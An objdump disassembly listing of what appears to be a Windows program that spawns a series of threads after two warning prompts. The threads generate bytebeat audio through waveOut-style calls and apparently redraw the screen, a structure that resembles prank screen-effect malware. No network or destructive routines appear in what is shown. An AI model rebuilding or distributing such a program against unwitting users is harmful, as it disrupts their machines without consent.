  404506:	ff 15 e8 60 40 00    	call   *0x4060e8
  40450c:	ff 74 24 08          	push   0x8(%esp)
  404510:	ff 15 f0 60 40 00    	call   *0x4060f0
  404516:	8b 8c 24 44 71 02 00 	mov    0x27144(%esp),%ecx
  40451d:	33 c0                	xor    %eax,%eax
  40451f:	5e                   	pop    %esi
  404520:	5b                   	pop    %ebx
  404521:	33 cc                	xor    %esp,%ecx
  404523:	e8 9c 09 00 00       	call   0x404ec4
  404528:	8b e5                	mov    %ebp,%esp
  40452a:	5d                   	pop    %ebp
  40452b:	c2 04 00             	ret    $0x4
  40452e:	cc                   	int3
  40452f:	cc                   	int3
  404530:	55                   	push   %ebp
  404531:	8b ec                	mov    %esp,%ebp
  404533:	83 e4 f8             	and    $0xfffffff8,%esp
  404536:	b8 40 71 02 00       	mov    $0x27140,%eax
  40453b:	e8 b0 17 00 00       	call   0x405cf0
  404540:	a1 08 80 40 00       	mov    0x408008,%eax
  404545:	33 c4                	xor    %esp,%eax
  404547:	89 84 24 3c 71 02 00 	mov    %eax,0x2713c(%esp)
  40454e:	53                   	push   %ebx
  40454f:	56                   	push   %esi
  404550:	33 c0                	xor    %eax,%eax
  404552:	c7 44 24 2c 01 00 01 	movl   $0x10001,0x2c(%esp)
  404559:	00 
  40455a:	50                   	push   %eax
  40455b:	50                   	push   %eax
  40455c:	50                   	push   %eax
  40455d:	66 89 44 24 48       	mov    %ax,0x48(%esp)
  404562:	8d 44 24 38          	lea    0x38(%esp),%eax
  404566:	50                   	push   %eax
  404567:	6a ff                	push   $0xffffffff
  404569:	8d 44 24 1c          	lea    0x1c(%esp),%eax
  40456d:	c7 44 24 44 40 1f 00 	movl   $0x1f40,0x44(%esp)
  404574:	00 
  404575:	50                   	push   %eax
  404576:	c7 44 24 50 01 00 08 	movl   $0x80001,0x50(%esp)
  40457d:	00 
  40457e:	c7 44 24 4c 40 1f 00 	movl   $0x1f40,0x4c(%esp)
  404585:	00 
  404586:	ff 15 e0 60 40 00    	call   *0x4060e0
  40458c:	33 f6                	xor    %esi,%esi
  40458e:	66 90                	xchg   %ax,%ax
  404590:	8b ce                	mov    %esi,%ecx
  404592:	8b c6                	mov    %esi,%eax
  404594:	c1 e9 08             	shr    $0x8,%ecx
  404597:	8b de                	mov    %esi,%ebx
  404599:	0b ce                	or     %esi,%ecx
  40459b:	c1 e8 07             	shr    $0x7,%eax
  40459e:	c1 e9 0a             	shr    $0xa,%ecx
  4045a1:	0f af ce             	imul   %esi,%ecx
  4045a4:	c1 eb 11             	shr    $0x11,%ebx
  4045a7:	0b de                	or     %esi,%ebx
  4045a9:	c1 eb 0d             	shr    $0xd,%ebx
  4045ac:	0f af de             	imul   %esi,%ebx
  4045af:	83 e1 07             	and    $0x7,%ecx
  4045b2:	33 c8                	xor    %eax,%ecx
  4045b4:	8b c6                	mov    %esi,%eax
  4045b6:	c1 e8 12             	shr    $0x12,%eax
  4045b9:	0b c8                	or     %eax,%ecx
  4045bb:	b8 ab aa aa aa       	mov    $0xaaaaaaab,%eax
  4045c0:	f7 e6                	mul    %esi
  4045c2:	d1 eb                	shr    $1,%ebx
  4045c4:	8b c6                	mov    %esi,%eax
  4045c6:	c1 ea 02             	shr    $0x2,%edx
  4045c9:	23 d6                	and    %esi,%edx
  4045cb:	d3 eb                	shr    %cl,%ebx
  4045cd:	c1 e8 04             	shr    $0x4,%eax
  4045d0:	8b ca                	mov    %edx,%ecx
  4045d2:	d3 e8                	shr    %cl,%eax
  4045d4:	0a d8                	or     %al,%bl
  4045d6:	88 5c 34 40          	mov    %bl,0x40(%esp,%esi,1)
  4045da:	46                   	inc    %esi
  4045db:	81 fe 00 71 02 00    	cmp    $0x27100,%esi
  4045e1:	72 ad                	jb     0x404590
  4045e3:	8d 44 24 40          	lea    0x40(%esp),%eax
  4045e7:	c7 44 24 10 00 71 02 	movl   $0x27100,0x10(%esp)
  4045ee:	00 
  4045ef:	89 44 24 0c          	mov    %eax,0xc(%esp)
  4045f3:	8d 44 24 0c          	lea    0xc(%esp),%eax
  4045f7:	6a 20                	push   $0x20
  4045f9:	50                   	push   %eax
  4045fa:	ff 74 24 10          	push   0x10(%esp)
  4045fe:	c7 44 24 20 00 00 00 	movl   $0x0,0x20(%esp)
  404605:	00 
  404606:	c7 44 24 24 00 00 00 	movl   $0x0,0x24(%esp)
  40460d:	00 
  40460e:	c7 44 24 28 00 00 00 	movl   $0x0,0x28(%esp)
  404615:	00 
  404616:	c7 44 24 2c 00 00 00 	movl   $0x0,0x2c(%esp)
  40461d:	00 
  40461e:	c7 44 24 30 00 00 00 	movl   $0x0,0x30(%esp)
  404625:	00 
  404626:	c7 44 24 34 00 00 00 	movl   $0x0,0x34(%esp)
  40462d:	00 
  40462e:	ff 15 ec 60 40 00    	call   *0x4060ec
  404634:	6a 20                	push   $0x20
  404636:	8d 44 24 10          	lea    0x10(%esp),%eax
  40463a:	50                   	push   %eax
  40463b:	ff 74 24 10          	push   0x10(%esp)
  40463f:	ff 15 e4 60 40 00    	call   *0x4060e4
  404645:	f6 44 24 1c 01       	testb  $0x1,0x1c(%esp)
  40464a:	75 11                	jne    0x40465d
  40464c:	8b 35 64 60 40 00    	mov    0x406064,%esi
  404652:	6a 64                	push   $0x64
  404654:	ff d6                	call   *%esi
  404656:	f6 44 24 1c 01       	testb  $0x1,0x1c(%esp)
  40465b:	74 f5                	je     0x404652
  40465d:	6a 20                	push   $0x20
  40465f:	8d 44 24 10          	lea    0x10(%esp),%eax
  404663:	50                   	push   %eax
  404664:	ff 74 24 10          	push   0x10(%esp)
  404668:	ff 15 e8 60 40 00    	call   *0x4060e8
  40466e:	ff 74 24 08          	push   0x8(%esp)
  404672:	ff 15 f0 60 40 00    	call   *0x4060f0
  404678:	8b 8c 24 44 71 02 00 	mov    0x27144(%esp),%ecx
  40467f:	33 c0                	xor    %eax,%eax
  404681:	5e                   	pop    %esi
  404682:	5b                   	pop    %ebx
  404683:	33 cc                	xor    %esp,%ecx
  404685:	e8 3a 08 00 00       	call   0x404ec4
  40468a:	8b e5                	mov    %ebp,%esp
  40468c:	5d                   	pop    %ebp
  40468d:	c2 04 00             	ret    $0x4
  404690:	55                   	push   %ebp
  404691:	8b ec                	mov    %esp,%ebp
  404693:	83 e4 f8             	and    $0xfffffff8,%esp
  404696:	b8 44 71 02 00       	mov    $0x27144,%eax
  40469b:	e8 50 16 00 00       	call   0x405cf0
  4046a0:	a1 08 80 40 00       	mov    0x408008,%eax
  4046a5:	33 c4                	xor    %esp,%eax
  4046a7:	89 84 24 40 71 02 00 	mov    %eax,0x27140(%esp)
  4046ae:	53                   	push   %ebx
  4046af:	56                   	push   %esi
  4046b0:	57                   	push   %edi
  4046b1:	33 c0                	xor    %eax,%eax
  4046b3:	c7 44 24 34 01 00 01 	movl   $0x10001,0x34(%esp)
  4046ba:	00 
  4046bb:	50                   	push   %eax
  4046bc:	50                   	push   %eax
  4046bd:	50                   	push   %eax
  4046be:	66 89 44 24 50       	mov    %ax,0x50(%esp)
  4046c3:	8d 44 24 40          	lea    0x40(%esp),%eax
  4046c7:	50                   	push   %eax
  4046c8:	6a ff                	push   $0xffffffff
  4046ca:	8d 44 24 24          	lea    0x24(%esp),%eax
  4046ce:	c7 44 24 4c 40 1f 00 	movl   $0x1f40,0x4c(%esp)
  4046d5:	00 
  4046d6:	50                   	push   %eax
  4046d7:	c7 44 24 58 01 00 08 	movl   $0x80001,0x58(%esp)
  4046de:	00 
  4046df:	c7 44 24 54 40 1f 00 	movl   $0x1f40,0x54(%esp)
  4046e6:	00 
  4046e7:	ff 15 e0 60 40 00    	call   *0x4060e0
  4046ed:	33 c0                	xor    %eax,%eax
  4046ef:	90                   	nop
  4046f0:	8b f8                	mov    %eax,%edi
  4046f2:	c1 ef 12             	shr    $0x12,%edi
  4046f5:	83 e7 01             	and    $0x1,%edi
  4046f8:	74 1a                	je     0x404714
  4046fa:	8b c8                	mov    %eax,%ecx
  4046fc:	8b f0                	mov    %eax,%esi
  4046fe:	81 e1 00 00 04 00    	and    $0x40000,%ecx
  404704:	81 c9 00 00 30 00    	or     $0x300000,%ecx
  40470a:	c1 e9 12             	shr    $0x12,%ecx
  40470d:	d3 ee                	shr    %cl,%esi
  40470f:	83 e6 03             	and    $0x3,%esi
  404712:	eb 02                	jmp    0x404716
  404714:	33 f6                	xor    %esi,%esi
  404716:	8b c8                	mov    %eax,%ecx
  404718:	8b d0                	mov    %eax,%edx
  40471a:	81 e1 00 00 04 00    	and    $0x40000,%ecx
  404720:	f7 da                	neg    %edx
  404722:	81 c9 00 00 38 00    	or     $0x380000,%ecx
  404728:	c1 e9 12             	shr    $0x12,%ecx
  40472b:	d3 ea                	shr    %cl,%edx
  40472d:	8d 4f 0d             	lea    0xd(%edi),%ecx
  404730:	80 e2 03             	and    $0x3,%dl
  404733:	0f b6 da             	movzbl %dl,%ebx
  404736:	8b d0                	mov    %eax,%edx
  404738:	f7 db                	neg    %ebx
  40473a:	1b db                	sbb    %ebx,%ebx
  40473c:	d3 ea                	shr    %cl,%edx
  40473e:	83 c3 02             	add    $0x2,%ebx
  404741:	8b c8                	mov    %eax,%ecx
  404743:	23 da                	and    %edx,%ebx
  404745:	c1 e9 07             	shr    $0x7,%ecx
  404748:	8b d0                	mov    %eax,%edx
  40474a:	33 de                	xor    %esi,%ebx
  40474c:	c1 ea 09             	shr    $0x9,%edx
  40474f:	4b                   	dec    %ebx
  404750:	32 d1                	xor    %cl,%dl
  404752:	83 e3 03             	and    $0x3,%ebx
  404755:	8b c8                	mov    %eax,%ecx
  404757:	83 c3 06             	add    $0x6,%ebx
  40475a:	c1 e9 10             	shr    $0x10,%ecx
  40475d:	83 e1 03             	and    $0x3,%ecx
  404760:	0f af d8             	imul   %eax,%ebx
  404763:	83 c1 06             	add    $0x6,%ecx
  404766:	0f af c8             	imul   %eax,%ecx
  404769:	c1 eb 03             	shr    $0x3,%ebx
  40476c:	80 e3 7f             	and    $0x7f,%bl
  40476f:	c1 e9 04             	shr    $0x4,%ecx
  404772:	0a d1                	or     %cl,%dl
  404774:	80 e2 7f             	and    $0x7f,%dl
  404777:	02 da                	add    %dl,%bl
  404779:	88 5c 04 48          	mov    %bl,0x48(%esp,%eax,1)
  40477d:	40                   	inc    %eax
  40477e:	3d 00 71 02 00       	cmp    $0x27100,%eax
  404783:	0f 82 67 ff ff ff    	jb     0x4046f0
  404789:	8d 44 24 48          	lea    0x48(%esp),%eax
  40478d:	c7 44 24 18 00 71 02 	movl   $0x27100,0x18(%esp)
  404794:	00 
  404795:	89 44 24 14          	mov    %eax,0x14(%esp)
  404799:	8d 44 24 14          	lea    0x14(%esp),%eax
  40479d:	6a 20                	push   $0x20
  40479f:	50                   	push   %eax
  4047a0:	ff 74 24 18          	push   0x18(%esp)
  4047a4:	c7 44 24 28 00 00 00 	movl   $0x0,0x28(%esp)
  4047ab:	00 
  4047ac:	c7 44 24 2c 00 00 00 	movl   $0x0,0x2c(%esp)
  4047b3:	00 
  4047b4:	c7 44 24 30 00 00 00 	movl   $0x0,0x30(%esp)
  4047bb:	00 
  4047bc:	c7 44 24 34 00 00 00 	movl   $0x0,0x34(%esp)
  4047c3:	00 
  4047c4:	c7 44 24 38 00 00 00 	movl   $0x0,0x38(%esp)
  4047cb:	00 
  4047cc:	c7 44 24 3c 00 00 00 	movl   $0x0,0x3c(%esp)
  4047d3:	00 
  4047d4:	ff 15 ec 60 40 00    	call   *0x4060ec
  4047da:	6a 20                	push   $0x20
  4047dc:	8d 44 24 18          	lea    0x18(%esp),%eax
  4047e0:	50                   	push   %eax
  4047e1:	ff 74 24 18          	push   0x18(%esp)
  4047e5:	ff 15 e4 60 40 00    	call   *0x4060e4
  4047eb:	f6 44 24 24 01       	testb  $0x1,0x24(%esp)
  4047f0:	75 11                	jne    0x404803
  4047f2:	8b 35 64 60 40 00    	mov    0x406064,%esi
  4047f8:	6a 64                	push   $0x64
  4047fa:	ff d6                	call   *%esi
  4047fc:	f6 44 24 24 01       	testb  $0x1,0x24(%esp)
  404801:	74 f5                	je     0x4047f8
  404803:	6a 20                	push   $0x20
  404805:	8d 44 24 18          	lea    0x18(%esp),%eax
  404809:	50                   	push   %eax
  40480a:	ff 74 24 18          	push   0x18(%esp)
  40480e:	ff 15 e8 60 40 00    	call   *0x4060e8
  404814:	ff 74 24 10          	push   0x10(%esp)
  404818:	ff 15 f0 60 40 00    	call   *0x4060f0
  40481e:	8b 8c 24 4c 71 02 00 	mov    0x2714c(%esp),%ecx
  404825:	33 c0                	xor    %eax,%eax
  404827:	5f                   	pop    %edi
  404828:	5e                   	pop    %esi
  404829:	5b                   	pop    %ebx
  40482a:	33 cc                	xor    %esp,%ecx
  40482c:	e8 93 06 00 00       	call   0x404ec4
  404831:	8b e5                	mov    %ebp,%esp
  404833:	5d                   	pop    %ebp
  404834:	c2 04 00             	ret    $0x4
  404837:	cc                   	int3
  404838:	cc                   	int3
  404839:	cc                   	int3
  40483a:	cc                   	int3
  40483b:	cc                   	int3
  40483c:	cc                   	int3
  40483d:	cc                   	int3
  40483e:	cc                   	int3
  40483f:	cc                   	int3
  404840:	55                   	push   %ebp
  404841:	8b ec                	mov    %esp,%ebp
  404843:	83 e4 f8             	and    $0xfffffff8,%esp
  404846:	b8 40 71 02 00       	mov    $0x27140,%eax
  40484b:	e8 a0 14 00 00       	call   0x405cf0
  404850:	a1 08 80 40 00       	mov    0x408008,%eax
  404855:	33 c4                	xor    %esp,%eax
  404857:	89 84 24 3c 71 02 00 	mov    %eax,0x2713c(%esp)
  40485e:	53                   	push   %ebx
  40485f:	56                   	push   %esi
  404860:	33 c0                	xor    %eax,%eax
  404862:	c7 44 24 2c 01 00 01 	movl   $0x10001,0x2c(%esp)
  404869:	00 
  40486a:	50                   	push   %eax
  40486b:	50                   	push   %eax
  40486c:	50                   	push   %eax
  40486d:	66 89 44 24 48       	mov    %ax,0x48(%esp)
  404872:	8d 44 24 38          	lea    0x38(%esp),%eax
  404876:	50                   	push   %eax
  404877:	6a ff                	push   $0xffffffff
  404879:	8d 44 24 1c          	lea    0x1c(%esp),%eax
  40487d:	c7 44 24 44 40 1f 00 	movl   $0x1f40,0x44(%esp)
  404884:	00 
  404885:	50                   	push   %eax
  404886:	c7 44 24 50 01 00 08 	movl   $0x80001,0x50(%esp)
  40488d:	00 
  40488e:	c7 44 24 4c 40 1f 00 	movl   $0x1f40,0x4c(%esp)
  404895:	00 
  404896:	ff 15 e0 60 40 00    	call   *0x4060e0
  40489c:	33 db                	xor    %ebx,%ebx
  40489e:	66 90                	xchg   %ax,%ax
  4048a0:	8b c3                	mov    %ebx,%eax
  4048a2:	8b d3                	mov    %ebx,%edx
  4048a4:	c1 e8 0b             	shr    $0xb,%eax
  4048a7:	8d 0c 80             	lea    (%eax,%eax,4),%ecx
  4048aa:	0f be c3             	movsbl %bl,%eax
  4048ad:	c1 e1 02             	shl    $0x2,%ecx
  4048b0:	d3 ea                	shr    %cl,%edx
  4048b2:	32 d3                	xor    %bl,%dl
  4048b4:	0f be ca             	movsbl %dl,%ecx
  4048b7:	0f af c8             	imul   %eax,%ecx
  4048ba:	88 4c 1c 40          	mov    %cl,0x40(%esp,%ebx,1)
  4048be:	43                   	inc    %ebx
  4048bf:	81 fb 00 71 02 00    	cmp    $0x27100,%ebx
  4048c5:	72 d9                	jb     0x4048a0
  4048c7:	8d 44 24 40          	lea    0x40(%esp),%eax
  4048cb:	c7 44 24 10 00 71 02 	movl   $0x27100,0x10(%esp)
  4048d2:	00 
  4048d3:	89 44 24 0c          	mov    %eax,0xc(%esp)
  4048d7:	8d 44 24 0c          	lea    0xc(%esp),%eax
  4048db:	6a 20                	push   $0x20
  4048dd:	50                   	push   %eax
  4048de:	ff 74 24 10          	push   0x10(%esp)
  4048e2:	c7 44 24 20 00 00 00 	movl   $0x0,0x20(%esp)
  4048e9:	00 
  4048ea:	c7 44 24 24 00 00 00 	movl   $0x0,0x24(%esp)
  4048f1:	00 
  4048f2:	c7 44 24 28 00 00 00 	movl   $0x0,0x28(%esp)
  4048f9:	00 
  4048fa:	c7 44 24 2c 00 00 00 	movl   $0x0,0x2c(%esp)
  404901:	00 
  404902:	c7 44 24 30 00 00 00 	movl   $0x0,0x30(%esp)
  404909:	00 
  40490a:	c7 44 24 34 00 00 00 	movl   $0x0,0x34(%esp)
  404911:	00 
  404912:	ff 15 ec 60 40 00    	call   *0x4060ec
  404918:	6a 20                	push   $0x20
  40491a:	8d 44 24 10          	lea    0x10(%esp),%eax
  40491e:	50                   	push   %eax
  40491f:	ff 74 24 10          	push   0x10(%esp)
  404923:	ff 15 e4 60 40 00    	call   *0x4060e4
  404929:	f6 44 24 1c 01       	testb  $0x1,0x1c(%esp)
  40492e:	75 11                	jne    0x404941
  404930:	8b 35 64 60 40 00    	mov    0x406064,%esi
  404936:	6a 64                	push   $0x64
  404938:	ff d6                	call   *%esi
  40493a:	f6 44 24 1c 01       	testb  $0x1,0x1c(%esp)
  40493f:	74 f5                	je     0x404936
  404941:	6a 20                	push   $0x20
  404943:	8d 44 24 10          	lea    0x10(%esp),%eax
  404947:	50                   	push   %eax
  404948:	ff 74 24 10          	push   0x10(%esp)
  40494c:	ff 15 e8 60 40 00    	call   *0x4060e8
  404952:	ff 74 24 08          	push   0x8(%esp)
  404956:	ff 15 f0 60 40 00    	call   *0x4060f0
  40495c:	8b 8c 24 44 71 02 00 	mov    0x27144(%esp),%ecx
  404963:	33 c0                	xor    %eax,%eax
  404965:	5e                   	pop    %esi
  404966:	5b                   	pop    %ebx
  404967:	33 cc                	xor    %esp,%ecx
  404969:	e8 56 05 00 00       	call   0x404ec4
  40496e:	8b e5                	mov    %ebp,%esp
  404970:	5d                   	pop    %ebp
  404971:	c2 04 00             	ret    $0x4
  404974:	cc                   	int3
  404975:	cc                   	int3
  404976:	cc                   	int3
  404977:	cc                   	int3
  404978:	cc                   	int3
  404979:	cc                   	int3
  40497a:	cc                   	int3
  40497b:	cc                   	int3
  40497c:	cc                   	int3
  40497d:	cc                   	int3
  40497e:	cc                   	int3
  40497f:	cc                   	int3
  404980:	55                   	push   %ebp
  404981:	8b ec                	mov    %esp,%ebp
  404983:	83 e4 f8             	and    $0xfffffff8,%esp
  404986:	b8 44 71 02 00       	mov    $0x27144,%eax
  40498b:	e8 60 13 00 00       	call   0x405cf0
  404990:	a1 08 80 40 00       	mov    0x408008,%eax
  404995:	33 c4                	xor    %esp,%eax
  404997:	89 84 24 40 71 02 00 	mov    %eax,0x27140(%esp)
  40499e:	56                   	push   %esi
  40499f:	33 c0                	xor    %eax,%eax
  4049a1:	c7 44 24 2c 01 00 01 	movl   $0x10001,0x2c(%esp)
  4049a8:	00 
  4049a9:	50                   	push   %eax
  4049aa:	50                   	push   %eax
  4049ab:	50                   	push   %eax
  4049ac:	66 89 44 24 48       	mov    %ax,0x48(%esp)
  4049b1:	8d 44 24 38          	lea    0x38(%esp),%eax
  4049b5:	50                   	push   %eax
  4049b6:	6a ff                	push   $0xffffffff
  4049b8:	8d 44 24 1c          	lea    0x1c(%esp),%eax
  4049bc:	c7 44 24 44 40 1f 00 	movl   $0x1f40,0x44(%esp)
  4049c3:	00 
  4049c4:	50                   	push   %eax
  4049c5:	c7 44 24 50 01 00 08 	movl   $0x80001,0x50(%esp)
  4049cc:	00 
  4049cd:	c7 44 24 4c 40 1f 00 	movl   $0x1f40,0x4c(%esp)
  4049d4:	00 
  4049d5:	ff 15 e0 60 40 00    	call   *0x4060e0
  4049db:	33 c0                	xor    %eax,%eax
  4049dd:	0f 1f 00             	nopl   (%eax)
  4049e0:	8b c8                	mov    %eax,%ecx
  4049e2:	c1 e9 02             	shr    $0x2,%ecx
  4049e5:	88 4c 04 40          	mov    %cl,0x40(%esp,%eax,1)
  4049e9:	40                   	inc    %eax
  4049ea:	3d 00 71 02 00       	cmp    $0x27100,%eax
  4049ef:	72 ef                	jb     0x4049e0
  4049f1:	8d 44 24 40          	lea    0x40(%esp),%eax
  4049f5:	c7 44 24 10 00 71 02 	movl   $0x27100,0x10(%esp)
  4049fc:	00 
  4049fd:	89 44 24 0c          	mov    %eax,0xc(%esp)
  404a01:	8d 44 24 0c          	lea    0xc(%esp),%eax
  404a05:	6a 20                	push   $0x20
  404a07:	50                   	push   %eax
  404a08:	ff 74 24 10          	push   0x10(%esp)
  404a0c:	c7 44 24 20 00 00 00 	movl   $0x0,0x20(%esp)
  404a13:	00 
  404a14:	c7 44 24 24 00 00 00 	movl   $0x0,0x24(%esp)
  404a1b:	00 
  404a1c:	c7 44 24 28 00 00 00 	movl   $0x0,0x28(%esp)
  404a23:	00 
  404a24:	c7 44 24 2c 00 00 00 	movl   $0x0,0x2c(%esp)
  404a2b:	00 
  404a2c:	c7 44 24 30 00 00 00 	movl   $0x0,0x30(%esp)
  404a33:	00 
  404a34:	c7 44 24 34 00 00 00 	movl   $0x0,0x34(%esp)
  404a3b:	00 
  404a3c:	ff 15 ec 60 40 00    	call   *0x4060ec
  404a42:	6a 20                	push   $0x20
  404a44:	8d 44 24 10          	lea    0x10(%esp),%eax
  404a48:	50                   	push   %eax
  404a49:	ff 74 24 10          	push   0x10(%esp)
  404a4d:	ff 15 e4 60 40 00    	call   *0x4060e4
  404a53:	f6 44 24 1c 01       	testb  $0x1,0x1c(%esp)
  404a58:	75 11                	jne    0x404a6b
  404a5a:	8b 35 64 60 40 00    	mov    0x406064,%esi
  404a60:	6a 64                	push   $0x64
  404a62:	ff d6                	call   *%esi
  404a64:	f6 44 24 1c 01       	testb  $0x1,0x1c(%esp)
  404a69:	74 f5                	je     0x404a60
  404a6b:	6a 20                	push   $0x20
  404a6d:	8d 44 24 10          	lea    0x10(%esp),%eax
  404a71:	50                   	push   %eax
  404a72:	ff 74 24 10          	push   0x10(%esp)
  404a76:	ff 15 e8 60 40 00    	call   *0x4060e8
  404a7c:	ff 74 24 08          	push   0x8(%esp)
  404a80:	ff 15 f0 60 40 00    	call   *0x4060f0
  404a86:	8b 8c 24 44 71 02 00 	mov    0x27144(%esp),%ecx
  404a8d:	33 c0                	xor    %eax,%eax
  404a8f:	5e                   	pop    %esi
  404a90:	33 cc                	xor    %esp,%ecx
  404a92:	e8 2d 04 00 00       	call   0x404ec4
  404a97:	8b e5                	mov    %ebp,%esp
  404a99:	5d                   	pop    %ebp
  404a9a:	c2 04 00             	ret    $0x4
  404a9d:	cc                   	int3
  404a9e:	cc                   	int3
  404a9f:	cc                   	int3
  404aa0:	55                   	push   %ebp
  404aa1:	8b ec                	mov    %esp,%ebp
  404aa3:	83 ec 08             	sub    $0x8,%esp
  404aa6:	53                   	push   %ebx
  404aa7:	56                   	push   %esi
  404aa8:	8b 35 bc 60 40 00    	mov    0x4060bc,%esi
  404aae:	57                   	push   %edi
  404aaf:	6a 44                	push   $0x44
  404ab1:	68 48 62 40 00       	push   $0x406248
  404ab6:	68 78 62 40 00       	push   $0x406278
  404abb:	6a 00                	push   $0x0
  404abd:	ff d6                	call   *%esi
  404abf:	83 f8 07             	cmp    $0x7,%eax
  404ac2:	75 08                	jne    0x404acc
  404ac4:	6a 00                	push   $0x0
  404ac6:	ff 15 54 60 40 00    	call   *0x406054
  404acc:	6a 34                	push   $0x34
  404ace:	68 98 62 40 00       	push   $0x406298
  404ad3:	68 08 63 40 00       	push   $0x406308
  404ad8:	6a 00                	push   $0x0
  404ada:	ff d6                	call   *%esi
  404adc:	83 f8 07             	cmp    $0x7,%eax
  404adf:	75 08                	jne    0x404ae9
  404ae1:	6a 00                	push   $0x0
  404ae3:	ff 15 54 60 40 00    	call   *0x406054
  404ae9:	8b 3d 64 60 40 00    	mov    0x406064,%edi
  404aef:	68 88 13 00 00       	push   $0x1388
  404af4:	ff d7                	call   *%edi
  404af6:	68 85 00 00 00       	push   $0x85
  404afb:	6a 00                	push   $0x0
  404afd:	6a 00                	push   $0x0
  404aff:	6a 00                	push   $0x0
  404b01:	ff 15 a8 60 40 00    	call   *0x4060a8
  404b07:	8b 1d 58 60 40 00    	mov    0x406058,%ebx
  404b0d:	6a 00                	push   $0x0
  404b0f:	6a 00                	push   $0x0
  404b11:	6a 00                	push   $0x0
  404b13:	68 00 10 40 00       	push   $0x401000
  404b18:	6a 00                	push   $0x0
  404b1a:	6a 00                	push   $0x0
  404b1c:	ff d3                	call   *%ebx
  404b1e:	6a 00                	push   $0x0
  404b20:	6a 00                	push   $0x0
  404b22:	6a 00                	push   $0x0
  404b24:	68 00 11 40 00       	push   $0x401100
  404b29:	6a 00                	push   $0x0
  404b2b:	6a 00                	push   $0x0
  404b2d:	89 45 fc             	mov    %eax,-0x4(%ebp)
  404b30:	ff d3                	call   *%ebx
  404b32:	6a 00                	push   $0x0
  404b34:	6a 00                	push   $0x0
  404b36:	6a 00                	push   $0x0
  404b38:	68 60 11 40 00       	push   $0x401160
  404b3d:	6a 00                	push   $0x0
  404b3f:	6a 00                	push   $0x0
  404b41:	89 45 f8             	mov    %eax,-0x8(%ebp)
  404b44:	ff d3                	call   *%ebx
  404b46:	6a 00                	push   $0x0
  404b48:	6a 00                	push   $0x0
  404b4a:	6a 00                	push   $0x0
  404b4c:	68 70 3d 40 00       	push   $0x403d70
  404b51:	6a 00                	push   $0x0
  404b53:	6a 00                	push   $0x0
  404b55:	8b f0                	mov    %eax,%esi
  404b57:	ff d3                	call   *%ebx
  404b59:	68 20 4e 00 00       	push   $0x4e20
  404b5e:	ff d7                	call   *%edi
  404b60:	8b 1d 60 60 40 00    	mov    0x406060,%ebx
  404b66:	6a 00                	push   $0x0
  404b68:	56                   	push   %esi
  404b69:	ff d3                	call   *%ebx
  404b6b:	8b 3d 5c 60 40 00    	mov    0x40605c,%edi
  404b71:	56                   	push   %esi
  404b72:	ff d7                	call   *%edi
  404b74:	68 85 00 00 00       	push   $0x85
  404b79:	6a 00                	push   $0x0
  404b7b:	6a 00                	push   $0x0
  404b7d:	6a 00                	push   $0x0
  404b7f:	ff 15 a8 60 40 00    	call   *0x4060a8
  404b85:	6a 64                	push   $0x64
  404b87:	ff 15 64 60 40 00    	call   *0x406064
  404b8d:	6a 00                	push   $0x0
  404b8f:	6a 00                	push   $0x0
  404b91:	6a 00                	push   $0x0
  404b93:	68 f0 12 40 00       	push   $0x4012f0
  404b98:	6a 00                	push   $0x0
  404b9a:	6a 00                	push   $0x0
  404b9c:	ff 15 58 60 40 00    	call   *0x406058
  404ba2:	6a 00                	push   $0x0
  404ba4:	6a 00                	push   $0x0
  404ba6:	6a 00                	push   $0x0
  404ba8:	68 c0 3e 40 00       	push   $0x403ec0
  404bad:	6a 00                	push   $0x0
  404baf:	6a 00                	push   $0x0
  404bb1:	8b f0                	mov    %eax,%esi
  404bb3:	ff 15 58 60 40 00    	call   *0x406058
  404bb9:	68 20 4e 00 00       	push   $0x4e20
  404bbe:	ff 15 64 60 40 00    	call   *0x406064
  404bc4:	6a 00                	push   $0x0
  404bc6:	56                   	push   %esi
  404bc7:	ff d3                	call   *%ebx
  404bc9:	56                   	push   %esi
  404bca:	ff d7                	call   *%edi
  404bcc:	68 85 00 00 00       	push   $0x85
  404bd1:	6a 00                	push   $0x0
  404bd3:	6a 00                	push   $0x0
  404bd5:	6a 00                	push   $0x0
  404bd7:	ff 15 a8 60 40 00    	call   *0x4060a8
  404bdd:	6a 64                	push   $0x64
  404bdf:	ff 15 64 60 40 00    	call   *0x406064
  404be5:	6a 00                	push   $0x0
  404be7:	6a 00                	push   $0x0
  404be9:	6a 00                	push   $0x0
  404beb:	68 70 14 40 00       	push   $0x401470
  404bf0:	6a 00                	push   $0x0
  404bf2:	6a 00                	push   $0x0
  404bf4:	ff 15 58 60 40 00    	call   *0x406058
  404bfa:	6a 00                	push   $0x0
  404bfc:	6a 00                	push   $0x0
  404bfe:	6a 00                	push   $0x0
  404c00:	68 00 40 40 00       	push   $0x404000
  404c05:	6a 00                	push   $0x0
  404c07:	6a 00                	push   $0x0
  404c09:	8b f0                	mov    %eax,%esi
  404c0b:	ff 15 58 60 40 00    	call   *0x406058
  404c11:	68 20 4e 00 00       	push   $0x4e20
  404c16:	ff 15 64 60 40 00    	call   *0x406064
  404c1c:	6a 00                	push   $0x0
  404c1e:	56                   	push   %esi
  404c1f:	ff d3                	call   *%ebx
  404c21:	56                   	push   %esi
  404c22:	ff d7                	call   *%edi
  404c24:	68 85 00 00 00       	push   $0x85
  404c29:	6a 00                	push   $0x0
  404c2b:	6a 00                	push   $0x0
  404c2d:	6a 00                	push   $0x0
  404c2f:	ff 15 a8 60 40 00    	call   *0x4060a8
  404c35:	6a 64                	push   $0x64
  404c37:	ff 15 64 60 40 00    	call   *0x406064
  404c3d:	6a 00                	push   $0x0
  404c3f:	6a 00                	push   $0x0
  404c41:	6a 00                	push   $0x0
  404c43:	68 20 17 40 00       	push   $0x401720
  404c48:	6a 00                	push   $0x0
  404c4a:	6a 00                	push   $0x0
  404c4c:	ff 15 58 60 40 00    	call   *0x406058
  404c52:	6a 00                	push   $0x0
  404c54:	6a 00                	push   $0x0
  404c56:	6a 00                	push   $0x0
  404c58:	68 40 41 40 00       	push   $0x404140
  404c5d:	6a 00                	push   $0x0
  404c5f:	6a 00                	push   $0x0
  404c61:	8b f0                	mov    %eax,%esi
  404c63:	ff 15 58 60 40 00    	call   *0x406058
  404c69:	68 20 4e 00 00       	push   $0x4e20
  404c6e:	ff 15 64 60 40 00    	call   *0x406064
  404c74:	6a 00                	push   $0x0
  404c76:	56                   	push   %esi
  404c77:	ff d3                	call   *%ebx
  404c79:	56                   	push   %esi
  404c7a:	ff d7                	call   *%edi
  404c7c:	68 85 00 00 00       	push   $0x85
  404c81:	6a 00                	push   $0x0
  404c83:	6a 00                	push   $0x0
